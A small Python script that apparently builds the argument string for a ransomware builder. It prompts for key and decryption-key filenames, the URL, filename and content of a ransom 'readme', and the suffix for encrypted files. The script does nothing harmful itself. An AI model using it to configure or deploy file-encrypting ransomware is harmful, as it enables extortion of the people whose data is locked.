#!/usr/bin/env python3

from collections import OrderedDict
import sys

arg = ""
no = OrderedDict({
    "KeyFilename": "Filename to store key file",
    "DkeyFilename": "Filename to store key file for decrypt",
    "ReadmeUrl": "URL of ONLINE readme file(keep blank to disable)",
    "ReadmeNetFilename": "Filename of ONLINE readme file(if enabled)",
    "Readme": "Content of OFFLINE readme file(ONE line)", "ReadmeFilename": "Filename of OFFLINE readme file",
    "Filesuffix": "Suffix to be added to the end of encrypted files(Include dot)", })

for k, q in no.items():
    print("Enter your " + q + ":",end="")
    tmp = input()
    print()
    arg += "-" + k + " \"" + tmp + "\" "

print(arg, file=sys.stderr)
